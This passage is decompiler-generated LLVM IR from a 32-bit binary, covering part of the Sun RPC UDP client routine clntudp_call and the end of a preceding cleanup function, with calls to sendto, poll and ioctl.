  %v1_80556f4 = inttoptr i32 %v3_80556e8 to i32*
  %v2_80556f4 = load i32, i32* %v1_80556f4, align 4
  %v1_80556f6 = call i32 @__libc_close(i32 %v2_80556f4)
  %v0_80556fe.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80556fe

dec_label_pc_80556fe:                             ; preds = %entry, %dec_label_pc_80556f1
  %v0_805570b = phi i32 [ %v3_80556e8, %entry ], [ %v0_80556fe.pre, %dec_label_pc_80556f1 ]
  %v1_80556fe = add i32 %v0_805570b, 60
  %v2_80556fe = inttoptr i32 %v1_80556fe to i32*
  %v3_80556fe = load i32, i32* %v2_80556fe, align 4
  %v1_8055701 = add i32 %v3_80556fe, 28
  %v2_8055701 = inttoptr i32 %v1_8055701 to i32*
  %v3_8055701 = load i32, i32* %v2_8055701, align 4
  %v1_8055704 = icmp eq i32 %v3_8055701, 0
  br i1 %v1_8055704, label %dec_label_pc_8055714, label %dec_label_pc_8055708

dec_label_pc_8055708:                             ; preds = %dec_label_pc_80556fe
  call void @__pseudo_call(i32 %v3_8055701)
  %v0_8055717.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8055714

dec_label_pc_8055714:                             ; preds = %dec_label_pc_80556fe, %dec_label_pc_8055708
  %v0_8055717 = phi i32 [ %v0_8055717.pre, %dec_label_pc_8055708 ], [ %v0_805570b, %dec_label_pc_80556fe ]
  %v1_8055718 = call i32 @free(i32 %v0_8055717)
  %v0_805571d = load i32, i32* @esi, align 4
  store i32 %v0_80556e0, i32* @ebx, align 4
  store i32 %v0_80556df, i32* @esi, align 4
  %v1_8055726 = call i32 @free(i32 %v0_805571d)
  ret i32 %v1_8055726

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055714, { 1, 0 }
  uselistorder label %dec_label_pc_80556fe, { 1, 0 }
}

define i32 @clntudp_call(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp79 = call i16 @__decompiler_undefined_function_3()
  %tmp80 = call i8 @__decompiler_undefined_function_5()
  %tmp88 = call i8 @__decompiler_undefined_function_5()
  %tmp89 = call i8 @__decompiler_undefined_function_5()
  %tmp90 = call i32 @__decompiler_undefined_function_0()
  %tmp92 = call i32 @__decompiler_undefined_function_0()
  %tmp111 = ptrtoint i32* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-76 = alloca i16, align 2
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8980 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-9036 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805572b = load i32, i32* @ebp, align 4
  store i32 %v0_805572b, i32* %stack_var_-4, align 4
  %v4_805572b = ptrtoint i32* %stack_var_-4 to i32
  store i32 1000, i32* %edx.global-to-local, align 4
  store i32 %v4_805572b, i32* @ebp, align 4
  %v0_8055733 = load i32, i32* @edi, align 4
  %v0_8055734 = load i32, i32* @esi, align 4
  %v0_8055735 = load i32, i32* @ebx, align 4
  %v15_8055736 = ptrtoint i32* %stack_var_-9036 to i32
  store i32 1000, i32* @ebx, align 4
  store i32 %tmp111, i32* %eax.global-to-local, align 4
  %v1_8055741 = add i32 %tmp111, 8
  %v2_8055741 = inttoptr i32 %v1_8055741 to i32*
  %v3_8055741 = load i32, i32* %v2_8055741, align 4
  store i32 %v3_8055741, i32* @esi, align 4
  %v2_8055744 = add i32 %v3_8055741, 28
  %v3_8055744 = inttoptr i32 %v2_8055744 to i32*
  %v4_8055744 = load i32, i32* %v3_8055744, align 4
  %v6_8055744 = mul i32 %v4_8055744, 1000
  store i32 %v6_8055744, i32* %ecx.global-to-local, align 4
  %v1_805574b = add i32 %v3_8055741, 32
  %v2_805574b = inttoptr i32 %v1_805574b to i32*
  %v3_805574b = load i32, i32* %v2_805574b, align 4
  %v1_805574e = ashr i32 %v3_805574b, 31
  %v2_805574f = zext i32 %v3_805574b to i64
  %v4_805574f = zext i32 %v1_805574e to i64
  %v5_805574f = mul nuw i64 %v4_805574f, 4294967296
  %v6_805574f = or i64 %v5_805574f, %v2_805574f
  %v8_805574f = sdiv i64 %v6_805574f, 1000
  %v9_805574f = trunc i64 %v8_805574f to i32
  store i32 %v9_805574f, i32* %eax.global-to-local, align 4
  %v10_805574f = srem i64 %v6_805574f, 1000
  %v11_805574f = trunc i64 %v10_805574f to i32
  store i32 %v11_805574f, i32* %edx.global-to-local, align 4
  %v2_8055751 = add i32 %v9_805574f, %v6_8055744
  store i32 %v2_8055751, i32* %ecx.global-to-local, align 4
  %v1_8055759 = add i32 %v3_8055741, 40
  %v2_8055759 = inttoptr i32 %v1_8055759 to i32*
  %v3_8055759 = load i32, i32* %v2_8055759, align 4
  %v13_8055759 = icmp eq i32 %v3_8055759, -1
  %v1_805575d = icmp eq i1 %v13_8055759, false
  br i1 %v1_805575d, label %dec_label_pc_8055796, label %dec_label_pc_805575f

dec_label_pc_805575f:                             ; preds = %entry
  store i32 %arg7, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80557a8

dec_label_pc_8055773:                             ; preds = %dec_label_pc_8055875
  %v1_8055773 = call i32 @__errno_location(i32 %storemerge3)
  store i32 %v1_8055773, i32* %eax.global-to-local, align 4
  %v1_8055778 = inttoptr i32 %v1_8055773 to i32*
  %v2_8055778 = load i32, i32* %v1_8055778, align 4
  store i32 %v2_8055778, i32* %eax.global-to-local, align 4
  %v0_805577a = load i32, i32* @esi, align 4
  %v1_805577a = add i32 %v0_805577a, 44
  %v2_805577a = inttoptr i32 %v1_805577a to i32*
  store i32 3, i32* %v2_805577a, align 4
  %v0_8055781 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055781 = load i32, i32* @esi, align 4
  %v2_8055781 = add i32 %v1_8055781, 48
  %v3_8055781 = inttoptr i32 %v2_8055781 to i32*
  store i32 %v0_8055781, i32* %v3_8055781, align 4
  store i32 3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055c7f

dec_label_pc_805578e:                             ; preds = %dec_label_pc_8055b2d
  %v1_805578e = add i32 %v0_805578e, 12
  %v2_805578e = inttoptr i32 %v1_805578e to i32*
  %v3_805578e = load i32, i32* %v2_805578e, align 4
  store i32 %v3_805578e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055b91

dec_label_pc_8055796:                             ; preds = %entry
  store i32 %v3_8055759, i32* %ecx.global-to-local, align 4
  %v1_805579f = add i32 %v3_8055741, 36
  %v2_805579f = inttoptr i32 %v1_805579f to i32*
  %v3_805579f = load i32, i32* %v2_805579f, align 4
  store i32 %v3_805579f, i32* @ebx, align 4
  br label %dec_label_pc_80557a8

dec_label_pc_80557a8:                             ; preds = %dec_label_pc_805575f, %dec_label_pc_8055796
  %stack_var_-9000.0 = phi i32 [ %v3_8055759, %dec_label_pc_8055796 ], [ %arg7, %dec_label_pc_805575f ]
  %storemerge3 = phi i32 [ %v3_805579f, %dec_label_pc_8055796 ], [ %arg6, %dec_label_pc_805575f ]
  %v4_80557d9 = icmp eq i32 %arg2, 0
  %v2_80558b5 = ptrtoint i32* %stack_var_-168 to i32
  %v2_80558ea = ptrtoint i32* %stack_var_-28 to i32
  %v4_8055a23 = and i8 %tmp88, 8
  %v5_8055a23 = icmp eq i8 %v4_8055a23, 0
  %v2_8055b4d = ptrtoint i32* %stack_var_-60 to i32
  %v2_8055b52 = ptrtoint i32* %stack_var_-20 to i32
  %v2_8055a50 = ptrtoint i16* %stack_var_-76 to i32
  %v2_8055a59 = ptrtoint i32* %stack_var_-36 to i32
  %v2_8055a6a = ptrtoint i32* %stack_var_-8980 to i32
  %v4_8055acd = and i8 %tmp80, 32
  %v5_8055acd = icmp eq i8 %v4_8055acd, 0
  %v2_8055afa = ptrtoint i32* %stack_var_-72 to i32
  %v4_8055b0a = zext i16 %tmp79 to i32
  %v2_8055bc6 = ptrtoint i32* %stack_var_-100 to i32
  %v2_8055bd0 = ptrtoint i32* %stack_var_-180 to i32
  %v2_8055921 = ptrtoint i32* %stack_var_-44 to i32
  %v2_8055961 = ptrtoint i32* %stack_var_-132 to i32
  %v4_8055989 = urem i8 %tmp89, 2
  %v5_8055989 = icmp eq i8 %v4_8055989, 0
  %v4_805589f = icmp eq i32 %storemerge3, 0
  %v4_80558a8 = icmp eq i32 %stack_var_-9000.0, 0
  %v2_8055801 = ptrtoint i32* %stack_var_8 to i32
  %v1_80558a6 = icmp eq i1 %v4_805589f, false
  br label %dec_label_pc_80557d0

dec_label_pc_80557d0:                             ; preds = %dec_label_pc_8055c6a, %dec_label_pc_80557a8
  %v1_80558bb59 = phi i32 [ %v15_8055736, %dec_label_pc_80557a8 ], [ %v1_8055c63, %dec_label_pc_8055c6a ]
  %v0_80557e3 = phi i32 [ %v3_8055741, %dec_label_pc_80557a8 ], [ %v0_80557d0.pre, %dec_label_pc_8055c6a ]
  %stack_var_-9016.0 = phi i32 [ %tmp90, %dec_label_pc_80557a8 ], [ %stack_var_-9016.2, %dec_label_pc_8055c6a ]
  %stack_var_-9012.0 = phi i32 [ %tmp92, %dec_label_pc_80557a8 ], [ %stack_var_-9012.2, %dec_label_pc_8055c6a ]
  %stack_var_-9004.0 = phi i32 [ 0, %dec_label_pc_80557a8 ], [ %stack_var_-9004.2, %dec_label_pc_8055c6a ]
  %stack_var_-9008.0 = phi i32 [ 0, %dec_label_pc_80557a8 ], [ %stack_var_-9008.2, %dec_label_pc_8055c6a ]
  %stack_var_-9020.0 = phi i32 [ 2, %dec_label_pc_80557a8 ], [ %v4_8055c6a, %dec_label_pc_8055c6a ]
  %stack_var_-9028.0 = phi i32 [ 0, %dec_label_pc_80557a8 ], [ %stack_var_-9028.2, %dec_label_pc_8055c6a ]
  %v1_80557d0 = add i32 %v0_80557e3, 56
  store i32 %v1_80557d0, i32* %eax.global-to-local, align 4
  br i1 %v4_80557d9, label %dec_label_pc_80558b5, label %dec_label_pc_805581b

dec_label_pc_805581b:                             ; preds = %dec_label_pc_80557d0
  %v2_80557e3 = inttoptr i32 %v1_80557d0 to i32*
  store i32 0, i32* %v2_80557e3, align 4
  %v1_80557ea = load i32, i32* @esp, align 4
  %v2_80557ea = add i32 %v1_80557ea, -4
  %v3_80557ea = inttoptr i32 %v2_80557ea to i32*
  store i32 %v2_8055bd0, i32* %v3_80557ea, align 4
  store i32 %v1_80557d0, i32* %edx.global-to-local, align 4
  %v2_80557f1 = add i32 %v1_80557ea, -8
  %v3_80557f1 = inttoptr i32 %v2_80557f1 to i32*
  store i32 %v2_8055bd0, i32* %v3_80557f1, align 4
  %v0_80557f2 = load i32, i32* %edx.global-to-local, align 4
  %v1_80557f2 = add i32 %v0_80557f2, 4
  %v2_80557f2 = inttoptr i32 %v1_80557f2 to i32*
  %v3_80557f2 = load i32, i32* %v2_80557f2, align 4
  store i32 %v3_80557f2, i32* %eax.global-to-local, align 4
  %v0_80557f5 = load i32, i32* @esi, align 4
  %v1_80557f5 = add i32 %v0_80557f5, 80
  %v2_80557f5 = inttoptr i32 %v1_80557f5 to i32*
  %v3_80557f5 = load i32, i32* %v2_80557f5, align 4
  %v5_80557f5 = add i32 %v1_80557ea, -12
  %v6_80557f5 = inttoptr i32 %v5_80557f5 to i32*
  store i32 %v3_80557f5, i32* %v6_80557f5, align 4
  %v0_80557f8 = load i32, i32* %edx.global-to-local, align 4
  %v2_80557f8 = add i32 %v1_80557ea, -16
  %v3_80557f8 = inttoptr i32 %v2_80557f8 to i32*
  store i32 %v0_80557f8, i32* %v3_80557f8, align 4
  %v1_80557f9 = add i32 %v1_80557ea, -20
  %v2_80557f9 = inttoptr i32 %v1_80557f9 to i32*
  store i32 134567932, i32* %v2_80557f9, align 4
  %v3_80557f9 = load i32, i32* %eax.global-to-local, align 4
  %v4_80557f9 = add i32 %v3_80557f9, 20
  %v5_80557f9 = inttoptr i32 %v4_80557f9 to i32*
  %v6_80557f9 = load i32, i32* %v5_80557f9, align 4
  call void @__pseudo_call(i32 %v6_80557f9)
  %v0_80557fc = load i32, i32* @esi, align 4
  %v1_80557fc = add i32 %v0_80557fc, 88
  %v2_80557fc = inttoptr i32 %v1_80557fc to i32*
  %v3_80557fc = load i32, i32* %v2_80557fc, align 4
  store i32 %v3_80557fc, i32* %eax.global-to-local, align 4
  %v1_80557ff = inttoptr i32 %v3_80557fc to i32*
  %v2_80557ff = load i32, i32* %v1_80557ff, align 4
  %v3_80557ff = add i32 %v2_80557ff, 1
  store i32 %v3_80557ff, i32* %v1_80557ff, align 4
  store i32 %v2_8055801, i32* %eax.global-to-local, align 4
  %v0_8055804 = load i32, i32* @esp, align 4
  %v1_8055804 = inttoptr i32 %v0_8055804 to i32*
  %v3_8055804 = add i32 %v0_8055804, 4
  store i32 %v1_80557d0, i32* %ecx.global-to-local, align 4
  %v1_805580b = inttoptr i32 %v3_8055804 to i32*
  %v1_805580c = add i32 %v0_80557e3, 60
  %v2_805580c = inttoptr i32 %v1_805580c to i32*
  %v3_805580c = load i32, i32* %v2_805580c, align 4
  store i32 %v3_805580c, i32* %edx.global-to-local, align 4
  store i32 %v2_8055801, i32* %v1_805580b, align 4
  %v0_8055810 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8055810, i32* %v1_8055804, align 4
  %v1_8055811 = add i32 %v0_8055804, -4
  %v2_8055811 = inttoptr i32 %v1_8055811 to i32*
  store i32 134567956, i32* %v2_8055811, align 4
  %v3_8055811 = load i32, i32* %edx.global-to-local, align 4
  %v4_8055811 = add i32 %v3_8055811, 4
  %v5_8055811 = inttoptr i32 %v4_8055811 to i32*
  %v6_8055811 = load i32, i32* %v5_8055811, align 4
  call void @__pseudo_call(i32 %v6_8055811)
  %v0_8055814 = load i32, i32* @esp, align 4
  store i32 %tmp111, i32* @ebx, align 4
  %v2_805581e = load i32, i32* %arg1, align 4
  store i32 %v2_805581e, i32* %eax.global-to-local, align 4
  %v0_8055820 = load i32, i32* %edx.global-to-local, align 4
  %v2_8055820 = add i32 %v0_8055814, 12
  %v3_8055820 = inttoptr i32 %v2_8055820 to i32*
  store i32 %v0_8055820, i32* %v3_8055820, align 4
  %v0_8055821 = load i32, i32* %edx.global-to-local, align 4
  %v2_8055821 = add i32 %v0_8055814, 8
  %v3_8055821 = inttoptr i32 %v2_8055821 to i32*
  store i32 %v0_8055821, i32* %v3_8055821, align 4
  %v1_8055822 = add i32 %v2_805581e, 32
  %v2_8055822 = inttoptr i32 %v1_8055822 to i32*
  %v3_8055822 = load i32, i32* %v2_8055822, align 4
  store i32 %v3_8055822, i32* %edx.global-to-local, align 4
  %v5_8055825 = add i32 %v0_8055814, 4
  %v6_8055825 = inttoptr i32 %v5_8055825 to i32*
  store i32 %v1_80557d0, i32* %v6_8055825, align 4
  %v3_805582b = inttoptr i32 %v0_8055814 to i32*
  store i32 %v2_805581e, i32* %v3_805582b, align 4
  %v1_805582c = add i32 %v0_8055814, -4
  %v2_805582c = inttoptr i32 %v1_805582c to i32*
  store i32 134567983, i32* %v2_805582c, align 4
  %v3_805582c = load i32, i32* %edx.global-to-local, align 4
  %v4_805582c = add i32 %v3_805582c, 4
  %v5_805582c = inttoptr i32 %v4_805582c to i32*
  %v6_805582c = load i32, i32* %v5_805582c, align 4
  call void @__pseudo_call(i32 %v6_805582c)
  %v0_805582f = load i32, i32* @esp, align 4
  %v1_8055832 = icmp eq i32 %v2_805581e, 0
  br i1 %v1_8055832, label %dec_label_pc_805584b, label %dec_label_pc_805585c

dec_label_pc_805584b:                             ; preds = %dec_label_pc_805581b
  store i32 1, i32* %eax.global-to-local, align 4
  %v0_8055850 = load i32, i32* @esi, align 4
  %v1_8055850 = add i32 %v0_8055850, 44
  %v2_8055850 = inttoptr i32 %v1_8055850 to i32*
  store i32 1, i32* %v2_8055850, align 4
  br label %dec_label_pc_8055c7f

dec_label_pc_805585c:                             ; preds = %dec_label_pc_805581b
  %v2_8055836 = add i32 %v0_805582f, 12
  %v3_8055836 = inttoptr i32 %v2_8055836 to i32*
  store i32 %v2_805581e, i32* %v3_8055836, align 4
  %v2_8055837 = add i32 %v0_805582f, 8
  %v3_8055837 = inttoptr i32 %v2_8055837 to i32*
  store i32 %v2_805581e, i32* %v3_8055837, align 4
  %v5_8055838 = add i32 %v0_805582f, 4
  %v6_8055838 = inttoptr i32 %v5_8055838 to i32*
  store i32 %arg3, i32* %v6_8055838, align 4
  %v6_805583b = inttoptr i32 %v0_805582f to i32*
  store i32 %v1_80557d0, i32* %v6_805583b, align 4
  %v1_8055841 = add i32 %v0_805582f, -4
  %v2_8055841 = inttoptr i32 %v1_8055841 to i32*
  store i32 134568004, i32* %v2_8055841, align 4
  call void @__pseudo_call(i32 %arg2)
  %v0_8055844 = load i32, i32* @esp, align 4
  store i32 %v1_80557d0, i32* %edx.global-to-local, align 4
  %v3_8055865 = load i32, i32* %v2_805580c, align 4
  store i32 %v3_8055865, i32* %eax.global-to-local, align 4
  %v3_8055868 = inttoptr i32 %v0_8055844 to i32*
  store i32 %v1_80557d0, i32* %v3_8055868, align 4
  %v1_8055869 = add i32 %v0_8055844, -4
  %v2_8055869 = inttoptr i32 %v1_8055869 to i32*
  store i32 134568044, i32* %v2_8055869, align 4
  %v3_8055869 = load i32, i32* %eax.global-to-local, align 4
  %v4_8055869 = add i32 %v3_8055869, 16
  %v5_8055869 = inttoptr i32 %v4_8055869 to i32*
  %v6_8055869 = load i32, i32* %v5_8055869, align 4
  call void @__pseudo_call(i32 %v6_8055869)
  %v0_805586c = load i32, i32* @esp, align 4
  %v1_805586c = add i32 %v0_805586c, 16
  %v0_805586f = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055875

dec_label_pc_8055875:                             ; preds = %dec_label_pc_80559f1, %dec_label_pc_80559dd, %dec_label_pc_805585c
  %v1_8055875 = phi i32 [ %v1_805597e, %dec_label_pc_80559dd ], [ %v1_805597e, %dec_label_pc_80559f1 ], [ %v1_805586c, %dec_label_pc_805585c ]
  %stack_var_-9016.1 = phi i32 [ %stack_var_-9016.3161, %dec_label_pc_80559dd ], [ %stack_var_-9016.3161, %dec_label_pc_80559f1 ], [ %stack_var_-9016.0, %dec_label_pc_805585c ]
  %stack_var_-9012.1 = phi i32 [ %v0_8055912, %dec_label_pc_80559dd ], [ %v0_8055912, %dec_label_pc_80559f1 ], [ %stack_var_-9012.0, %dec_label_pc_805585c ]
  %stack_var_-9004.1 = phi i32 [ %stack_var_-9004.3.lcssa, %dec_label_pc_80559dd ], [ %stack_var_-9004.3.lcssa, %dec_label_pc_80559f1 ], [ %stack_var_-9004.0, %dec_label_pc_805585c ]
  %stack_var_-9008.1 = phi i32 [ %storemerge7.in.lcssa, %dec_label_pc_80559dd ], [ %storemerge7.in.lcssa, %dec_label_pc_80559f1 ], [ %stack_var_-9008.0, %dec_label_pc_805585c ]
  %stack_var_-9028.1 = phi i32 [ %stack_var_-9028.2, %dec_label_pc_80559dd ], [ %stack_var_-9028.2, %dec_label_pc_80559f1 ], [ %v0_805586f, %dec_label_pc_805585c ]
  %v0_8055875 = load i32, i32* @edi, align 4
  %v2_8055875 = add i32 %v1_8055875, -4
  %v3_8055875 = inttoptr i32 %v2_8055875 to i32*
  store i32 %v0_8055875, i32* %v3_8055875, align 4
  %v0_8055876 = load i32, i32* @edi, align 4
  %v2_8055876 = add i32 %v1_8055875, -8
  %v3_8055876 = inttoptr i32 %v2_8055876 to i32*
  store i32 %v0_8055876, i32* %v3_8055876, align 4
  %v0_8055877 = load i32, i32* @esi, align 4
  %v1_8055877 = add i32 %v0_8055877, 24
  %v2_8055877 = inttoptr i32 %v1_8055877 to i32*
  %v3_8055877 = load i32, i32* %v2_8055877, align 4
  %v5_8055877 = add i32 %v1_8055875, -12
  %v6_8055877 = inttoptr i32 %v5_8055877 to i32*
  store i32 %v3_8055877, i32* %v6_8055877, align 4
  %v0_805587a = load i32, i32* @esi, align 4
  %v1_805587a = add i32 %v0_805587a, 8
  store i32 %v1_805587a, i32* %eax.global-to-local, align 4
  %v2_805587d = add i32 %v1_8055875, -16
  %v3_805587d = inttoptr i32 %v2_805587d to i32*
  store i32 %v1_805587a, i32* %v3_805587d, align 4
  %v1_805587e = add i32 %v1_8055875, -20
  %v2_805587e = inttoptr i32 %v1_805587e to i32*
  store i32 0, i32* %v2_805587e, align 4
  %v5_8055880 = add i32 %v1_8055875, -24
  %v6_8055880 = inttoptr i32 %v5_8055880 to i32*
  store i32 %stack_var_-9028.1, i32* %v6_8055880, align 4
  %v0_8055886 = load i32, i32* @esi, align 4
  %v1_8055886 = add i32 %v0_8055886, 88
  %v2_8055886 = inttoptr i32 %v1_8055886 to i32*
  %v3_8055886 = load i32, i32* %v2_8055886, align 4
  %v5_8055886 = add i32 %v1_8055875, -28
  %v6_8055886 = inttoptr i32 %v5_8055886 to i32*
  store i32 %v3_8055886, i32* %v6_8055886, align 4
  %v0_8055889 = load i32, i32* @esi, align 4
  %v1_8055889 = inttoptr i32 %v0_8055889 to i32*
  %v2_8055889 = load i32, i32* %v1_8055889, align 4
  %v4_8055889 = add i32 %v1_8055875, -32
  %v5_8055889 = inttoptr i32 %v4_8055889 to i32*
  store i32 %v2_8055889, i32* %v5_8055889, align 4
  %v6_805588b = call i32 @__libc_sendto(i32 %stack_var_-9028.1, i32 %v2_8055751, i32 %stack_var_-9020.0, i32 %stack_var_-9016.1, i32 %stack_var_-9012.1, i32 %stack_var_-9008.1)
  store i32 %v6_805588b, i32* %eax.global-to-local, align 4
  %v0_8055890 = load i32, i32* @esp, align 4
  %v1_8055890 = add i32 %v0_8055890, 32
  %v15_8055893 = icmp eq i32 %v6_805588b, %stack_var_-9028.1
  %v1_8055899 = icmp eq i1 %v15_8055893, false
  br i1 %v1_8055899, label %dec_label_pc_8055773, label %dec_label_pc_805589f

dec_label_pc_805589f:                             ; preds = %dec_label_pc_8055875
  br i1 %v1_80558a6, label %dec_label_pc_80558b5, label %dec_label_pc_80558a8

dec_label_pc_80558a8:                             ; preds = %dec_label_pc_805589f
  br i1 %v4_80558a8, label %dec_label_pc_80558a8.dec_label_pc_8055a03_crit_edge, label %dec_label_pc_80558b5

dec_label_pc_80558a8.dec_label_pc_8055a03_crit_edge: ; preds = %dec_label_pc_80558a8
  %v0_8055a08.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8055a03

dec_label_pc_80558b5:                             ; preds = %dec_label_pc_80558a8, %dec_label_pc_805589f, %dec_label_pc_80557d0
  %v1_80558bb = phi i32 [ %v1_80558bb59, %dec_label_pc_80557d0 ], [ %v1_8055890, %dec_label_pc_805589f ], [ %v1_8055890, %dec_label_pc_80558a8 ]
  %stack_var_-9016.2 = phi i32 [ %stack_var_-9016.0, %dec_label_pc_80557d0 ], [ %stack_var_-9016.1, %dec_label_pc_805589f ], [ %stack_var_-9016.1, %dec_label_pc_80558a8 ]
  %stack_var_-9012.2 = phi i32 [ %stack_var_-9012.0, %dec_label_pc_80557d0 ], [ %stack_var_-9012.1, %dec_label_pc_805589f ], [ %stack_var_-9012.1, %dec_label_pc_80558a8 ]
  %stack_var_-9004.2 = phi i32 [ %stack_var_-9004.0, %dec_label_pc_80557d0 ], [ %stack_var_-9004.1, %dec_label_pc_805589f ], [ %stack_var_-9004.1, %dec_label_pc_80558a8 ]
  %stack_var_-9008.2 = phi i32 [ %stack_var_-9008.0, %dec_label_pc_80557d0 ], [ %stack_var_-9008.1, %dec_label_pc_805589f ], [ %stack_var_-9008.1, %dec_label_pc_80558a8 ]
  %stack_var_-9028.2 = phi i32 [ %stack_var_-9028.0, %dec_label_pc_80557d0 ], [ %stack_var_-9028.1, %dec_label_pc_805589f ], [ %stack_var_-9028.1, %dec_label_pc_80558a8 ]
  store i32 %v2_80558b5, i32* %eax.global-to-local, align 4
  %v0_80558bb = load i32, i32* @ebx, align 4
  %v2_80558bb = add i32 %v1_80558bb, -4
  %v3_80558bb = inttoptr i32 %v2_80558bb to i32*
  store i32 %v0_80558bb, i32* %v3_80558bb, align 4
  %v1_80558bc = add i32 %v1_80558bb, -8
  %v2_80558bc = inttoptr i32 %v1_80558bc to i32*
  store i32 12, i32* %v2_80558bc, align 4
  %v1_80558be = add i32 %v1_80558bb, -12
  %v2_80558be = inttoptr i32 %v1_80558be to i32*
  store i32 ptrtoint (i32* @global_var_8067a80.299 to i32), i32* %v2_80558be, align 4
  %v2_80558c3 = add i32 %v1_80558bb, -16
  %v3_80558c3 = inttoptr i32 %v2_80558c3 to i32*
  store i32 %v2_80558b5, i32* %v3_80558c3, align 4
  %v3_80558c4 = inttoptr i32 %stack_var_-9028.2 to i16*
  %v4_80558c4 = call i32 @memcpy(i16* %v3_80558c4, i32 %v2_8055751, i32 %stack_var_-9020.0)
  store i32 %v4_80558c4, i32* %eax.global-to-local, align 4
  store i32 %arg5, i32* %ecx.global-to-local, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v0_80558db = load i32, i32* @esi, align 4
  %v1_80558db = inttoptr i32 %v0_80558db to i32*
  %v2_80558db = load i32, i32* %v1_80558db, align 4
  store i32 %v2_80558db, i32* %eax.global-to-local, align 4
  %v0_80558dd = load i32, i32* @esp, align 4
  %v1_80558dd = add i32 %v0_80558dd, 16
  store i32 %v2_80558db, i32* %stack_var_-28, align 4
  %v1_8055a39 = add i32 %stack_var_-9028.2, 286
  %v1_8055a41 = and i32 %v1_8055a39, -16
  br label %dec_label_pc_80558e9

dec_label_pc_80558e9:                             ; preds = %dec_label_pc_8055ba5, %dec_label_pc_8055bb4, %dec_label_pc_8055b8b.dec_label_pc_80558e9.backedge_crit_edge, %dec_label_pc_80558b5
  %v1_80558e9 = phi i32 [ %v1_80558dd, %dec_label_pc_80558b5 ], [ %v1_80558e9.pre.pre, %dec_label_pc_8055b8b.dec_label_pc_80558e9.backedge_crit_edge ], [ %v1_8055b6e, %dec_label_pc_8055bb4 ], [ %v1_8055b6e, %dec_label_pc_8055ba5 ]
  %v0_80558e9 = phi i32 [ %arg5, %dec_label_pc_80558b5 ], [ %v0_80558e9.pre.pre, %dec_label_pc_8055b8b.dec_label_pc_80558e9.backedge_crit_edge ], [ %v6_8055b69, %dec_label_pc_8055bb4 ], [ %v6_8055b69, %dec_label_pc_8055ba5 ]
  %v2_80558e9 = add i32 %v1_80558e9, -4
  %v3_80558e9 = inttoptr i32 %v2_80558e9 to i32*
  store i32 %v0_80558e9, i32* %v3_80558e9, align 4
  store i32 %v2_80558ea, i32* %eax.global-to-local, align 4
  %v5_80558ed = add i32 %v1_80558e9, -8
  %v6_80558ed = inttoptr i32 %v5_80558ed to i32*
  store i32 %v2_8055751, i32* %v6_80558ed, align 4
  %v1_80558f3 = add i32 %v1_80558e9, -12
  %v2_80558f3 = inttoptr i32 %v1_80558f3 to i32*
  store i32 1, i32* %v2_80558f3, align 4
  %v2_80558f5 = add i32 %v1_80558e9, -16
  %v3_80558f5 = inttoptr i32 %v2_80558f5 to i32*
  store i32 %v2_80558ea, i32* %v3_80558f5, align 4
  %v0_80558f6 = call i32 @__libc_poll()
  store i32 %v0_80558f6, i32* %eax.global-to-local, align 4
  %v0_80558fb = load i32, i32* @esp, align 4
  %v1_80558fb = add i32 %v0_80558fb, 16
  %v10_80558fe = icmp eq i32 %v0_80558f6, -1
  br i1 %v10_80558fe, label %dec_label_pc_8055a14, label %dec_label_pc_8055907

dec_label_pc_8055907:                             ; preds = %dec_label_pc_80558e9
  %v1_8055907 = icmp eq i32 %v0_80558f6, 0
  %v1_8055909 = icmp eq i1 %v1_8055907, false
  br i1 %v1_8055909, label %dec_label_pc_8055a23, label %dec_label_pc_805590f

dec_label_pc_805590f:                             ; preds = %dec_label_pc_8055907
  %v0_805590f = load i32, i32* @esi, align 4
  %v1_805590f = inttoptr i32 %v0_805590f to i32*
  %v2_805590f = load i32, i32* %v1_805590f, align 4
  store i32 %v2_805590f, i32* %eax.global-to-local, align 4
  %v0_8055911 = load i32, i32* @edx, align 4
  %v2_8055911 = add i32 %v0_80558fb, 12
  %v3_8055911 = inttoptr i32 %v2_8055911 to i32*
  store i32 %v0_8055911, i32* %v3_8055911, align 4
  %v0_8055912 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v2_8055921, i32* %eax.global-to-local, align 4
  %v2_8055924 = add i32 %v0_80558fb, 8
  %v3_8055924 = inttoptr i32 %v2_8055924 to i32*
  store i32 %v2_8055921, i32* %v3_8055924, align 4
  %v1_8055925 = add i32 %v0_80558fb, 4
  %v2_8055925 = inttoptr i32 %v1_8055925 to i32*
  store i32 35090, i32* %v2_8055925, align 4
  %v6_805592a = inttoptr i32 %v0_80558fb to i32*
  store i32 %v0_8055912, i32* %v6_805592a, align 4
  store i32 8800, i32* %stack_var_-44, align 4
  %v3_8055937 = call i32 @ioctl(i32 %v0_8055912, i32 %stack_var_-9008.2, i32 %stack_var_-9004.2)
  store i32 %v3_8055937, i32* %eax.global-to-local, align 4
  %v1_805593f = icmp eq i32 %v3_8055937, 0
  %v1_8055941 = icmp eq i1 %v1_805593f, false
